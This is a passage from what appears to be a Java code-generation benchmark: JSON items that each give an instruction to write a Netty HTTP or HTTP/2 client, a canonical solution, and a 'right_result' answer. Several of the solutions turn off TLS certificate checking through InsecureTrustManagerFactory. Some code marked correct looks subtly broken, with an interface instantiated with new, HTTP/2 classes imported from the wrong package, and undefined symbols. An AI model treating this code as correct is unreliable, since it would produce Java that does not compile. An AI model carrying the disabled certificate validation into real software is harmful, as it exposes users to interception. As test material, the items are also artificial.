channel.remoteAddress());\n            } else {\n                System.err.println(\"Failed to connect to server: \" + f.cause());\n                scheduleReconnect();\n            }\n        });\n    }\n\n    private void scheduleReconnect() {\n        reconnectExecutor = Executors.newSingleThreadScheduledExecutor();\n        reconnectTask = reconnectExecutor.scheduleAtFixedRate(this::connect, interval, interval, TimeUnit.SECONDS);\n    }\n\n    static class ReconnectHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void handlerRemoved(ChannelHandlerContext ctx) {\n            ctx.fireChannelInactive();\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            ctx.fireChannelRead(null);\n        }\n    }\n\n    interface Config {\n        boolean getBoolean(String key, boolean defaultValue);\n\n        long getLong(String key, long defaultValue);\n\n        int getInt(String key, int defaultValue);\n\n        String getString(String key, String defaultValue);\n\n        String[] getStringArray(String key);\n    }\n}\n```"
  },
  {
    "Task_id": 144,
    "Instruction": "Task Description: Create a Java class that implements a HTTP client using Netty framework to send HTTP requests and receive responses.\n\nClass Description: The HttpSnoopClient class is a Netty-based HTTP client that establishes TCP connections, sends HTTP requests, and handles responses. It supports SSL/TLS connections and provides methods for connection management.\n\nAttributes:\n- group: [NioEventLoopGroup] - Manages event loops for client I/O operations\n- bootstrap: [Bootstrap] - Configures and initializes the Netty client\n- channel: [Channel] - Represents the active network connection\n\nMethods:\n- HttpSnoopClient(): [Constructor] -> [void] - Initializes the event loop group and bootstrap instance\n- connect(String host, int port, SslContext sslCtx): [void] -> [void] - Establishes a connection to the specified host and port with optional SSL context\n- sendRequest(URI uri, String host): [void] -> [void] - Sends an HTTP GET request to the specified URI with appropriate headers\n- waitForClose(): [void] -> [void] - Waits for the channel to close\n- shutdown(): [void] -> [void] - Shuts down the event loop group gracefully\n- createSslContext(): [static] -> [SslContext] - Creates and returns an SSL context with insecure trust manager for testing purposes",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.cookie.ClientCookieEncoder;\nimport io.netty.handler.codec.http.cookie.DefaultCookie;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.net.URI;\n\npublic final class HttpSnoopClient {\n\n    static final String URL = System.getProperty(\"url\", \"http://127.0.0.1:8080/\");\n\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public HttpSnoopClient() {\n        group = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n    }\n\n    public void connect(String host, int port, SslContext sslCtx) throws InterruptedException {\n        bootstrap.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new HttpSnoopClientInitializer(sslCtx));\n        channel = bootstrap.connect(host, port).sync().channel();\n    }\n\n    public void sendRequest(URI uri, String host) {\n        HttpRequest request = new DefaultFullHttpRequest(\n                HttpVersion.HTTP_1_1, HttpMethod.GET, uri.getRawPath());\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);\n        request.headers().set(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n        request.headers().set(\n                HttpHeaderNames.COOKIE,\n                ClientCookieEncoder.STRICT.encode(\n                        new DefaultCookie(\"my-cookie\", \"foo\"),\n                        new DefaultCookie(\"another-cookie\", \"bar\")));\n        channel.writeAndFlush(request);\n    }\n\n    public void waitForClose() throws InterruptedException {\n        channel.closeFuture().sync();\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    public static SslContext createSslContext() throws Exception {\n        return SslContextBuilder.forClient()\n            .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport javax.net.ssl.SSLEngine;\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\n\npublic class HttpSnoopClient {\n    private final NioEventLoopGroup group = new NioEventLoopGroup();\n    private final Bootstrap bootstrap = new Bootstrap();\n    private Channel channel;\n    private final CountDownLatch closeLatch = new CountDownLatch(1);\n\n    public HttpSnoopClient() {\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(\n                                new HttpClientCodec(),\n                                new HttpResponseDecoder(),\n                                new HttpObjectAggregator(8192),\n                                new SimpleChannelInboundHandler<FullHttpResponse>() {\n                                    @Override\n                                    protected void channelRead0(ChannelHandlerContext ctx, FullHttpResponse response) {\n                                        System.out.println(\"STATUS: \" + response.status());\n                                        System.out.println(\"VERSION: \" + response.protocolVersion());\n                                        System.out.println(\"HEADERS: \" + response.headers());\n                                        if (response.content().isReadable()) {\n                                            System.out.println(\"CONTENT: \" + response.content().toString(io.netty.util.CharsetUtil.UTF_8));\n                                        }\n                                        closeLatch.countDown();\n                                    }\n\n                                    @Override\n                                    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                                        cause.printStackTrace();\n                                        closeLatch.countDown();\n                                    }\n                                });\n                    }\n                });\n    }\n\n    public void connect(String host, int port, SslContext sslCtx) throws Exception {\n        ChannelFuture future = bootstrap.connect(host, port).sync();\n        channel = future.channel();\n\n        if (sslCtx != null) {\n            SSLEngine engine = sslCtx.newEngine(channel.alloc(), host, port);\n            engine.setUseClientMode(true);\n            channel.pipeline().addFirst(new SslHandler(engine));\n        }\n    }\n\n    public void sendRequest(URI uri, String host) {\n        String url = uri.getRawPath();\n        if (uri.getQuery() != null) {\n            url += \"?\" + uri.getRawQuery();\n        }\n\n        FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, url,\n                Unpooled.EMPTY_BUFFER);\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);\n        request.headers().set(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n\n        channel.writeAndFlush(request);\n    }\n\n    public void waitForClose() throws InterruptedException {\n        closeLatch.await();\n        channel.closeFuture().sync();\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    public static SslContext createSslContext() {\n        try {\n            return SslContextBuilder.forClient()\n                    .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                    .build();\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 145,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 client using Netty framework to establish TCP connections, send HTTP/2 requests, and handle responses.\n\nClass Description: The Http2Client class provides functionality to connect to an HTTP/2 server, send requests, and disconnect gracefully. It uses Netty's non-blocking I/O capabilities for efficient network communication.\n\nAttributes:\n- HOST: [String] - The host address to connect to (default: \"127.0.0.1\")\n- PORT: [int] - The port number to connect to (default: 8080)\n- URL: [String] - The endpoint path for HTTP requests (default: \"/whatever\")\n- workerGroup: [EventLoopGroup] - Manages client-side I/O threads\n- initializer: [Http2ClientInitializer] - Configures the client pipeline\n- channel: [Channel] - Represents the network communication channel\n\nMethods:\n- connect(): [void] - Establishes a TCP connection to the specified host and port using Netty's Bootstrap\n- sendRequest(): [void] - Sends an HTTP/2 request to the connected server and waits for responses\n- disconnect(): [void] - Closes the connection and releases resources gracefully",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpScheme;\nimport io.netty.handler.codec.http2.HttpConversionUtil;\nimport io.netty.util.AsciiString;\nimport java.util.concurrent.TimeUnit;\n\npublic final class Http2Client {\n\n    private static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    private static final int PORT = 8080;\n    private static final String URL = System.getProperty(\"url\", \"/whatever\");\n\n    private EventLoopGroup workerGroup;\n    private Http2ClientInitializer initializer;\n    private Channel channel;\n\n    public void connect() throws Exception {\n        workerGroup = new NioEventLoopGroup();\n        initializer = new Http2ClientInitializer(Integer.MAX_VALUE);\n\n        Bootstrap b = new Bootstrap();\n        b.group(workerGroup);\n        b.channel(NioSocketChannel.class);\n        b.option(ChannelOption.SO_KEEPALIVE, true);\n        b.remoteAddress(HOST, PORT);\n        b.handler(initializer);\n\n        channel = b.connect().syncUninterruptibly().channel();\n        System.out.println(\"Connected to [\" + HOST + ':' + PORT + ']');\n    }\n\n    public void sendRequest() throws Exception {\n        Http2SettingsHandler http2SettingsHandler = initializer.settingsHandler();\n        http2SettingsHandler.awaitSettings(5, TimeUnit.SECONDS);\n\n        HttpResponseHandler responseHandler = initializer.responseHandler();\n        int streamId = 3;\n        HttpScheme scheme = HttpScheme.HTTP;\n        AsciiString hostName = new AsciiString(HOST + ':' + PORT);\n        System.err.println(\"Sending request(s)...\");\n\n        if (URL != null) {\n            FullHttpRequest request = new DefaultFullHttpRequest(HTTP_1_1, GET, URL, Unpooled.EMPTY_BUFFER);\n            request.headers().add(HttpHeaderNames.HOST, hostName);\n            request.headers().add(HttpConversionUtil.ExtensionHeaderNames.SCHEME.text(), scheme.name());\n            request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n            request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);\n            responseHandler.put(streamId, channel.write(request), channel.newPromise());\n        }\n\n        channel.flush();\n        responseHandler.awaitResponses(5, TimeUnit.SECONDS);\n        System.out.println(\"Finished HTTP/2 request(s)\");\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close().syncUninterruptibly();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttp2Headers;\nimport io.netty.handler.codec.http.Http2FrameLogger;\nimport io.netty.handler.codec.http.Http2MultiplexHandler;\nimport io.netty.handler.ssl.ApplicationProtocolConfig;\nimport io.netty.handler.ssl.ApplicationProtocolNames;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class Http2Client {\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = 8080;\n    private static final String URL = \"/whatever\";\n\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private Channel channel;\n\n    public void connect() throws Exception {\n        SslContext sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                .applicationProtocolConfig(new ApplicationProtocolConfig(\n                        ApplicationProtocolConfig.Protocol.ALPN,\n                        ApplicationProtocolConfig.SelectorFailureBehavior.FATAL,\n                        ApplicationProtocolConfig.SelectedListenerFailureBehavior.ACCEPT,\n                        ApplicationProtocolNames.HTTP_2))\n                .build();\n\n        Bootstrap b = new Bootstrap();\n        b.group(workerGroup);\n        b.channel(NioSocketChannel.class);\n        b.option(ChannelOption.SO_KEEPALIVE, true);\n        b.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ChannelPipeline pipeline = ch.pipeline();\n                pipeline.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                pipeline.addLast(new Http2FrameLogger(LogLevel.INFO, \"http2\"));\n                pipeline.addLast(new Http2MultiplexHandler(new DefaultHttp2ClientHandler()));\n            }\n        });\n\n        channel = b.connect(HOST, PORT).sync().channel();\n    }\n\n    public void sendRequest() {\n        if (channel != null && channel.isActive()) {\n            DefaultHttp2Headers headers = new DefaultHttp2Headers();\n            headers.method(\"GET\");\n            headers.path(URL);\n            headers.authority(HOST + \":\" + PORT);\n\n            channel.writeAndFlush(headers).addListener(ChannelFutureListener.CLOSE_ON_FAILURE);\n        }\n    }\n\n    public void disconnect() {\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private static class DefaultHttp2ClientHandler extends SimpleChannelInboundHandler<Object> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            System.out.println(\"Received: \" + msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        Http2Client client = new Http2Client();\n        try {\n            client.connect();\n            client.sendRequest();\n            Thread.sleep(5000);\n        } finally {\n            client.disconnect();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 146,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to multiple hosts, send HTTP requests, and handle responses.\n\nClass Description: NettyTcpClient is a TCP client implementation using Netty framework that connects to multiple hosts, sends HTTP GET requests to a specified path, and handles responses. It manages connection lifecycle and includes automatic reconnection on failure.\n\nAttributes:\n- hosts: List<String> - List of host addresses to connect to\n- port: int - TCP port number for connections\n- path: String - HTTP path for GET requests\n- group: EventLoopGroup - Netty event loop group for managing I/O threads\n- bootstrap: Bootstrap - Netty bootstrap for client configuration\n- channelConnectListener: ChannelConnectListener - Listener for connection events\n\nMethods:\n- NettyTcpClient(List<String> hosts, int port, String path) -> None - Constructor that initializes the client with target hosts, port, and request path\n- connect() -> None - Initiates connections to all specified hosts\n- shutdown() -> None - Gracefully shuts down the client and releases resources\n- ResponseHandler(Bootstrap bootstrap) -> None - (Inner class constructor) Handles HTTP responses and manages request cycle\n- channelActive(ChannelHandlerContext ctx) -> None - (Inner class method) Called when channel becomes active, sends initial request\n- channelRead0(ChannelHandlerContext ctx, HttpObject msg) -> None - (Inner class method) Processes incoming HTTP messages\n- channelInactive(ChannelHandlerContext ctx) -> None - (Inner class method) Handles channel disconnection and triggers reconnection\n- sendRequest(ChannelHandlerContext ctx) -> None - (Inner class method) Sends HTTP GET request\n- operationComplete(ChannelFuture future) -> None - (Inner class method) Listener callback for connection completion events",
    "Canonical_solution": "import com.github.ambry.rest.RestUtils;\nimport com.github.ambry.utils.Pair;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.ByteBufAllocator;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.DefaultHttpRequest;\nimport io.netty.handler.codec.http.HttpChunkedInput;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpMethod;\nimport io.netty.handler.codec.http.HttpObject;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpResponse;\nimport io.netty.handler.codec.http.HttpUtil;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.stream.ChunkedInput;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicLong;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class NettyTcpClient {\n\n  private final List<String> hosts;\n  private final int port;\n  private final String path;\n  private final EventLoopGroup group;\n  private final Bootstrap bootstrap;\n  private final ChannelConnectListener channelConnectListener = new ChannelConnectListener();\n\n  public NettyTcpClient(List<String> hosts, int port, String path) {\n    this.hosts = hosts;\n    this.port = port;\n    this.path = path;\n    this.group = new NioEventLoopGroup();\n    this.bootstrap = new Bootstrap()\n        .group(group)\n        .channel(NioSocketChannel.class)\n        .handler(new ChannelInitializer<SocketChannel>() {\n          @Override\n          public void initChannel(SocketChannel ch) {\n            ch.pipeline()\n                .addLast(new HttpClientCodec())\n                .addLast(new ChunkedWriteHandler())\n                .addLast(new ResponseHandler(bootstrap));\n          }\n        });\n  }\n\n  public void connect() {\n    for (String host : hosts) {\n      ChannelFuture future = bootstrap.connect(host, port);\n      future.addListener(channelConnectListener);\n    }\n  }\n\n  public void shutdown() {\n    group.shutdownGracefully();\n  }\n\n  private class ResponseHandler extends SimpleChannelInboundHandler<HttpObject> {\n    private final Logger logger = LoggerFactory.getLogger(getClass());\n    private final Bootstrap bootstrap;\n    private HttpRequest request;\n\n    ResponseHandler(Bootstrap bootstrap) {\n      this.bootstrap = bootstrap;\n    }\n\n    @Override\n    public void channelActive(ChannelHandlerContext ctx) {\n      sendRequest(ctx);\n    }\n\n    @Override\n    public void channelRead0(ChannelHandlerContext ctx, HttpObject msg) {\n      if (msg instanceof HttpResponse) {\n        HttpResponse response = (HttpResponse) msg;\n        if (!HttpUtil.isKeepAlive(response)) {\n          ctx.close();\n        }\n      }\n      if (msg instanceof LastHttpContent) {\n        if (ctx.channel().isActive()) {\n          sendRequest(ctx);\n        }\n      }\n    }\n\n    @Override\n    public void channelInactive(ChannelHandlerContext ctx) {\n      ctx.close();\n      bootstrap.connect().addListener(channelConnectListener);\n    }\n\n    private void sendRequest(ChannelHandlerContext ctx) {\n      request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, path);\n      ctx.writeAndFlush(request);\n    }\n  }\n\n  private class ChannelConnectListener implements GenericFutureListener<ChannelFuture> {\n    @Override\n    public void operationComplete(ChannelFuture future) {\n      if (!future.isSuccess()) {\n        logger.error(\"Channel connection failed\", future.cause());\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.util.CharsetUtil;\n\nimport java.net.InetSocketAddress;\nimport java.util.List;\n\npublic class NettyTcpClient {\n    private final List<String> hosts;\n    private final int port;\n    private final String path;\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n    private final ChannelConnectListener channelConnectListener = new ChannelConnectListener();\n\n    public NettyTcpClient(List<String> hosts, int port, String path) {\n        this.hosts = hosts;\n        this.port = port;\n        this.path = path;\n        this.group = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new HttpClientCodec());\n                        pipeline.addLast(new ResponseHandler(bootstrap));\n                    }\n                });\n    }\n\n    public void connect() {\n        for (String host : hosts) {\n            bootstrap.connect(new InetSocketAddress(host, port)).addListener(channelConnectListener);\n        }\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    public interface ChannelConnectListener extends GenericFutureListener<ChannelFuture> {}\n\n    private class ResponseHandler extends SimpleChannelInboundHandler<HttpObject> {\n        private final Bootstrap bootstrap;\n\n        public ResponseHandler(Bootstrap bootstrap) {\n            this.bootstrap = bootstrap;\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            sendRequest(ctx);\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, HttpObject msg) {\n            if (msg instanceof HttpResponse) {\n                HttpResponse response = (HttpResponse) msg;\n                System.out.println(\"STATUS: \" + response.status());\n            }\n            if (msg instanceof HttpContent) {\n                HttpContent content = (HttpContent) msg;\n                System.out.println(\"CONTENT: \" + content.content().toString(CharsetUtil.UTF_8));\n            }\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            System.out.println(\"Connection closed, attempting reconnection...\");\n            bootstrap.connect(new InetSocketAddress(((InetSocketAddress) ctx.channel().remoteAddress()).getHostName(), port))\n                    .addListener(channelConnectListener);\n        }\n\n        private void sendRequest(ChannelHandlerContext ctx) {\n            FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, path,\n                    Unpooled.copiedBuffer(\"Hello World\", CharsetUtil.UTF_8));\n            request.headers().set(HttpHeaderNames.HOST, ((InetSocketAddress) ctx.channel().remoteAddress()).getHostName());\n            request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);\n            request.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain\");\n            request.headers().setInt(HttpHeaderNames.CONTENT_LENGTH, request.content().readableBytes());\n            ctx.writeAndFlush(request);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    private class ChannelConnectListenerImpl implements ChannelConnectListener {\n        @Override\n        public void operationComplete(ChannelFuture future) {\n            if (!future.isSuccess()) {\n                System.err.println(\"Failed to connect.\");\n                future.cause().printStackTrace();\n            } else {\n                System.out.println(\"Connected successfully.\");\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 147,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 client using Netty framework, capable of establishing TCP connections, sending HTTP requests, and handling responses.\n\nClass Description: NettyHttp2Client is a HTTP/2 client implementation using Netty's non-blocking I/O. It manages connection lifecycle, sends HTTP requests, and processes responses through configured handlers.\n\nAttributes:\n- workerGroup: [NioEventLoopGroup] - Manages client-side I/O threads\n- initializer: [Http2ClientInitializer] - Configures the client pipeline with HTTP/2 handlers\n- bootstrap: [Bootstrap] - Configures and manages the TCP client connection\n- channel: [Channel] - Represents the active network connection\n\nMethods:\n- NettyHttp2Client(String host, int port) -> [Constructor] - Initializes the client with target host and port\n- configureBootstrap(String host, int port) -> [void] - Configures the bootstrap with connection parameters\n- connect() -> [void] - Establishes connection to the server\n- sendRequest(URI hostName) -> [void] - Sends HTTP GET request to specified URI\n- disconnect() -> [void] - Closes connection and releases resources\n\nNested Classes:\n- Http2ClientInitializer: [ChannelInitializer<SocketChannel>] - Configures the pipeline for HTTP/2 communication\n- Http2SettingsHandler: [SimpleChannelInboundHandler<Http2Settings>] - Handles HTTP/2 settings negotiation\n- UpgradeRequestHandler: [ChannelInboundHandlerAdapter] - Manages HTTP upgrade to HTTP/2\n- UserEventLogger: [ChannelInboundHandlerAdapter] - Logs channel events",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpClientUpgradeHandler;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpMethod;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http2.DefaultHttp2Connection;\nimport io.netty.handler.codec.http2.DefaultHttp2FrameReader;\nimport io.netty.handler.codec.http2.DefaultHttp2FrameWriter;\nimport io.netty.handler.codec.http2.DelegatingDecompressorFrameListener;\nimport io.netty.handler.codec.http2.Http2ClientUpgradeCodec;\nimport io.netty.handler.codec.http2.Http2Connection;\nimport io.netty.handler.codec.http2.Http2FrameLogger;\nimport io.netty.handler.codec.http2.Http2FrameReader;\nimport io.netty.handler.codec.http2.Http2FrameWriter;\nimport io.netty.handler.codec.http2.Http2InboundFrameLogger;\nimport io.netty.handler.codec.http2.Http2OutboundFrameLogger;\nimport io.netty.handler.codec.http2.Http2Settings;\nimport io.netty.handler.codec.http2.HttpConversionUtil;\nimport io.netty.handler.codec.http2.HttpToHttp2ConnectionHandler;\nimport io.netty.handler.codec.http2.HttpToHttp2ConnectionHandlerBuilder;\nimport io.netty.handler.codec.http2.InboundHttp2ToHttpAdapterBuilder;\nimport io.netty.handler.logging.LogLevel;\nimport java.net.URI;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttp2Client {\n\n    private final EventLoopGroup workerGroup;\n    private final Http2ClientInitializer initializer;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public NettyHttp2Client(String host, int port) {\n        this.workerGroup = new NioEventLoopGroup();\n        this.initializer = new Http2ClientInitializer(Integer.MAX_VALUE);\n        this.bootstrap = new Bootstrap();\n        configureBootstrap(host, port);\n    }\n\n    private void configureBootstrap(String host, int port) {\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .remoteAddress(host, port)\n                .handler(initializer);\n    }\n\n    public void connect() {\n        channel = bootstrap.connect().syncUninterruptibly().channel();\n        Http2SettingsHandler http2SettingsHandler = initializer.settingsHandler();\n        http2SettingsHandler.awaitSettings(5, TimeUnit.SECONDS);\n    }\n\n    public void sendRequest(URI hostName) throws Exception {\n        HttpResponseHandler responseHandler = initializer.responseHandler();\n        int streamId = 3;\n        final ChannelPromise promise = channel.newPromise();\n        responseHandler.put(streamId, promise);\n        FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, hostName.toString());\n        request.headers().add(HttpHeaderNames.HOST, hostName);\n        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);\n        channel.writeAndFlush(request);\n        promise.await(10, TimeUnit.SECONDS);\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close().syncUninterruptibly();\n        }\n        workerGroup.shutdownGracefully();\n    }\n\n    static class Http2ClientInitializer extends ChannelInitializer<SocketChannel> {\n        private static final Http2FrameLogger logger = new Http2FrameLogger(LogLevel.INFO, Http2ClientInitializer.class);\n        private final int maxContentLength;\n        private HttpToHttp2ConnectionHandler connectionHandler;\n        private HttpResponseHandler responseHandler;\n        private Http2SettingsHandler settingsHandler;\n\n        Http2ClientInitializer(int maxContentLength) {\n            this.maxContentLength = maxContentLength;\n        }\n\n        @Override\n        public void initChannel(SocketChannel ch) throws Exception {\n            final Http2Connection connection = new DefaultHttp2Connection(false);\n            connectionHandler = new HttpToHttp2ConnectionHandlerBuilder()\n                    .connection(connection)\n                    .frameListener(new DelegatingDecompressorFrameListener(connection,\n                            new InboundHttp2ToHttpAdapterBuilder(connection)\n                                    .maxContentLength(maxContentLength)\n                                    .propagateSettings(true)\n                                    .build()))\n                    .build();\n            responseHandler = new HttpResponseHandler();\n            settingsHandler = new Http2SettingsHandler(ch.newPromise());\n            configureClearText(ch);\n        }\n\n        public HttpResponseHandler responseHandler() {\n            return responseHandler;\n        }\n\n        public Http2SettingsHandler settingsHandler() {\n            return settingsHandler;\n        }\n\n        protected void configureEndOfPipeline(ChannelPipeline pipeline) {\n            pipeline.addLast(settingsHandler, responseHandler);\n        }\n\n        private void configureClearText(SocketChannel ch) {\n            HttpClientCodec sourceCodec = new HttpClientCodec();\n            Http2ClientUpgradeCodec upgradeCodec = new Http2ClientUpgradeCodec(connectionHandler);\n            HttpClientUpgradeHandler upgradeHandler = new HttpClientUpgradeHandler(sourceCodec, upgradeCodec, 65536);\n            ch.pipeline().addLast(sourceCodec, upgradeHandler, new UpgradeRequestHandler(), new UserEventLogger());\n        }\n\n        private static Http2FrameReader frameReader() {\n            return new Http2InboundFrameLogger(new DefaultHttp2FrameReader(), logger);\n        }\n\n        private static Http2FrameWriter frameWriter() {\n            return new Http2OutboundFrameLogger(new DefaultHttp2FrameWriter(), logger);\n        }\n\n        private final class 